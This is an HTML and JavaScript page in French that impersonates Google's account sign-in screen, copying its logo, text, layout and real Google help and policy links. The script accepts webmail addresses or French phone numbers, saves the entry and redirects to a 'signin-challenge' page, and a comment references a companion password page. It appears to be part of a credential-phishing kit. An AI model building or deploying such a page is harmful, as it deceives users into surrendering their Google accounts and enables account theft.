<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion - Google</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

  <style>
    a {
      color: #a8c7fa;
      text-decoration: none;
    }

    body {
      margin: 0;
      background-color: #1e1f20;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 30px;
      box-sizing: border-box;
    }

    .container {
      background-color: #0e0e0e;
      color: white;
      width: 1100px;
      height: 400px;
      border-radius: 30px;
      padding: 30px 40px;
      box-sizing: border-box;
      position: relative;
      display: flex;
      overflow: hidden; /* nécessaire pour que la barre disparaisse hors de la box */
    }

    .logo {
      position: absolute;
      top: 30px;
      left: 30px;
    }

    .logo img {
      height: 50px;
    }

    .left {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding-left: 20px;
      padding-bottom: 100px;
    }

    .left h1 {
      font-size: 40px;
      font-weight: normal;
      margin-bottom: 10px;
    }

    .left p {
      font-size: 15px;
      color: #ccc;
    }

    .right {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding-right: 20px;
    }

    .input-box {
      position: relative;
      width: 100%;
    }

    .input-box input {
      width: 100%;
      padding: 14px 10px;
      font-size: 16px;
      border: 2px solid #a8c7fa;
      border-radius: 5px;
      outline: none;
      background-color: #0e0e0e;
      color: white;
    }

    .input-box label {
      position: absolute;
      top: 14px;
      left: 12px;
      color: #aaa;
      font-size: 16px;
      pointer-events: none;
      transition: all 0.2s ease;
    }

    .input-box input:focus + label,
    .input-box input:not(:placeholder-shown) + label {
      top: -10px;
      left: 10px;
      font-size: 12px;
      color: #a8c7fa;
      background-color: #0e0e0e;
      padding: 0 4px;
    }

    .input-error {
      border: 2px solid #f2b8b5 !important;
    }

    .label-error {
      color: #f2b8b5 !important;
    }

    #errorMessage {
      color: #f2b8b5;
      font-size: 13px;
      margin-top: 6px;
      display: none;
    }

    .info-text {
      margin-top: 30px;
      color: #c4c7c5;
      font-size: 14px;
      padding-left: 2px;
    }

    .suivant-btn {
      position: absolute;
      bottom: 20px;
      right: 40px;
      background-color: #b6d0fb;
      color: rgb(0, 0, 0);
      border: none;
      border-radius: 25px;
      padding: 10px 30px;
      font-size: 16px;
      cursor: pointer;
    }

    .suivant-btn:hover {
      background-color: #b6d0fb;
    }

    .forgot-email {
      margin-top: 8px;
      font-size: 14px;
    }

    .forgot-email a {
      color: #a8c7fa;
      text-decoration: none;
    }

    .forgot-email a:hover {
      text-decoration: underline;
    }

    /* Barre de chargement (segment avec début et fin, se déplace et disparaît hors de la .container) */
    #loading-bar {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      z-index: 1000;
      display: none;
      pointer-events: none;
      overflow: visible;
    }

    #loading-bar .loading-inner {
      position: absolute;
      top: 0;
      left: -40%;
      width: 36%;
      height: 100%;
      background-color: #b6d0fb;
      border-radius: 2px;
      animation: slide 1s linear infinite;
      will-change: transform;
    }

    @keyframes slide {
      0%   { transform: translateX(0%); }
      100% { transform: translateX(380%); }
    }

    /* Overlay gris semi-transparent (même nom que sur GoogleMdp pour cohérence) */
    #overlay-blur {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(30, 31, 32, 0.6);
      z-index: 998;
      display: none;
      align-items: center;
      justify-content: center;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    /* Footer avec options de langue et liens */
    .footer {
      width: 1100px;
      background-color: transparent;
      padding: 20px 40px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-sizing: border-box;
      margin-top: 30px;
    }

    .footer-left {
      display: flex;
      align-items: center;
    }

    .language-selector {
      background-color: transparent;
      border: none;
      color: white;
      font-size: 14px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 0;
    }

    .language-selector:hover {
      color: #a8c7fa;
    }

    .language-selector::after {
      content: "▼";
      font-size: 10px;
    }

    .footer-right {
      display: flex;
      gap: 25px;
      align-items: center;
    }

    .footer-right a {
      color: white;
      text-decoration: none;
      font-size: 14px;
      transition: color 0.2s ease;
    }

    .footer-right a:hover {
      color: #a8c7fa;
    }
  </style>

<script>
  // Durées (modifiable à la volée via les fonctions ci‑dessous)
  let MIN_LOADING_MS = 3000;   // durée minimale d'affichage du loader (ms)
  let OVERLAY_MIN_MS = 3500;   // durée minimale pendant laquelle l'overlay reste visible (ms)

  // fonctions utilitaires pour modifier les durées dynamiquement
  function setMinLoadingDuration(ms) { MIN_LOADING_MS = Math.max(0, Number(ms) || 0); }
  function setOverlayDuration(ms) { OVERLAY_MIN_MS = Math.max(0, Number(ms) || 0); }

  document.addEventListener("DOMContentLoaded", function () {
    const bouton = document.querySelector(".suivant-btn");
    const input = document.getElementById("emailInput");
    const label = document.querySelector("label[for='emailInput']");
    const errorMessage = document.getElementById("errorMessage");
    const overlayBlur = document.getElementById("overlay-blur");
    const loadingContainer = document.getElementById("loading-bar");
    const loadingInner = loadingContainer ? loadingContainer.querySelector(".loading-inner") : null;
    let loadingStart = 0;

    function isValidEmailOrPhone(value) {
      const emailRegex = /^[a-zA-Z0-9._%+-]+@(?:gmail\.com|hotmail\.fr|yahoo\.(?:fr|com)|outlook\.(?:com|fr)|protonmail\.com|free\.fr|orange\.fr)$/i;
      const phoneRegex = /^(\+33|0)[1-9](\d{2}){4}$/;
      return emailRegex.test(value) || phoneRegex.test(value);
    }

    function showLoading() {
      if (overlayBlur) overlayBlur.style.display = "flex";
      if (!loadingContainer || !loadingInner) { loadingStart = Date.now(); return; }
      loadingContainer.style.display = "block";
      // relancer animation proprement
      loadingInner.style.animation = "none";
      // force reflow
      // eslint-disable-next-line no-unused-expressions
      loadingInner.offsetWidth;
      loadingInner.style.animation = null; // reprend la règle CSS
      loadingStart = Date.now();
    }

    function _performHideLoading() {
      if (!loadingContainer || !loadingInner) {
        if (loadingContainer) loadingContainer.style.display = "none";
        if (overlayBlur) overlayBlur.style.display = "none";
        return;
      }
      // laisser l'animation faire une dernière itération puis cacher
      loadingInner.style.animationIterationCount = "1";
      const onEnd = function () {
        loadingContainer.style.display = "none";
        loadingInner.style.animationIterationCount = "infinite";
        if (overlayBlur) overlayBlur.style.display = "none";
        loadingInner.removeEventListener("animationend", onEnd);
      };
      loadingInner.addEventListener("animationend", onEnd);
    }

    function hideLoading() {
      if (!loadingContainer || !loadingInner) {
        if (loadingContainer) loadingContainer.style.display = "none";
        if (overlayBlur) overlayBlur.style.display = "none";
        return;
      }
      const elapsed = Date.now() - loadingStart;
      const remainingLoader = MIN_LOADING_MS - elapsed;
      // On applique aussi la contrainte OVERLAY_MIN_MS pour forcer un grisé minimum
      const remainingOverlay = OVERLAY_MIN_MS - elapsed;
      const remaining = Math.max(0, Math.max(remainingLoader, remainingOverlay));
      if (remaining > 0) {
        setTimeout(_performHideLoading, remaining);
      } else {
        _performHideLoading();
      }
    }

    bouton.addEventListener("click", function () {
      const valeur = input.value.trim();

      if (valeur === "") {
        input.classList.add("input-error");
        label.classList.add("label-error");
        errorMessage.style.display = "block";
        errorMessage.textContent = "Saisissez une adresse e-mail ou un numéro de téléphone";
        return;
      }

      if (!isValidEmailOrPhone(valeur)) {
        input.classList.add("input-error");
        label.classList.add("label-error");
        errorMessage.style.display = "block";
        errorMessage.textContent = "Entrez une adresse e-mail valide ou un numéro de téléphone.";
        return;
      }

      // validation ok — afficher overlay et barre de chargement
      showLoading();

      // sauvegarde immédiate
      localStorage.setItem("email", valeur);

      // cacher le loader/overlay après la durée minimum
      // hideLoading gèrera la durée minimale (MIN_LOADING_MS) et OVERLAY_MIN_MS
      // on peut appeler hideLoading dès réception de la réponse ; ici on lève un timeout simulant la réponse
      setTimeout(() => {
        hideLoading();
        // petit délai pour laisser l'animation de sortie se faire proprement puis rediriger
        setTimeout(() => { window.location.href = "v3-signin-challenge.html"; }, 3000);
      }, 0); // réponse immédiate simulée : hideLoading s'occupe des min durations
    });

    input.addEventListener("input", function () {
      input.classList.remove("input-error");
      label.classList.remove("label-error");
      errorMessage.style.display = "none";
    });

    // Gestion du sélecteur de langue
    const languageButton = document.querySelector(".language-selector");
    languageButton.addEventListener("click", function () {
      // Vous pouvez ajouter une logique de dropdown ici
      console.log("Langue cliquée");
    });
  });
</script>
</head>
<body>
  <div id="overlay-blur"></div>

  <div class="container">
    <!-- barre de chargement INSÉRÉE DANS .container pour qu'elle soit clipée -->
    <div id="loading-bar">
      <div class="loading-inner"></div>
    </div>

    <div class="logo">
      <img src="https://www.gstatic.com/images/branding/product/1x/googleg_32dp.png" alt="Logo">
    </div>

    <div class="left">
      <h1>Connexion</h1>
      <p>avec votre compte Google. Ce compte sera disponible pour d'autres applis Google dans le navigateur.</p>
    </div>

    <div class="right">
      <div class="input-box">
        <input type="text" id="emailInput" required placeholder=" ">
        <label for="emailInput">Adresse e-mail ou téléphone</label>
        <small id="errorMessage">Saisissez une adresse e-mail ou un numéro de téléphone</small>
        <div class="forgot-email">
          <a href="https://support.google.com/accounts/answer/7682439?hl=fr" target="_blank">Adresse e-mail oubliée ?</a>
        </div>
      </div>
      <div class="info-text">
        Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en mode privé.
        <a href="https://support.google.com/chrome/answer/6130773?hl=fr" target="_blank">En savoir plus sur l'utilisation du mode Invité</a>
      </div>
    </div>

    <button class="suivant-btn">Suivant</button>
  </div>

  <!-- Footer avec options -->
  <div class="footer">
    <div class="footer-left">
      <button class="language-selector">Français (France)</button>
    </div>
    <div class="footer-right">
      <a href="https://support.google.com/accounts?hl=fr&visit_id=638964685813799550-2638493007&rd=2&p=account_iph#topic=3382296">Aide</a>
      <a href="https://policies.google.com/privacy?gl=FR&hl=fr">Confidentialité</a>
      <a href="https://policies.google.com/terms?gl=FR&hl=fr">Conditions</a>
    </div>
  </div>

  <div id="overlay-spinner">
    <div class="loader"></div>
  </div>
</body>
</html>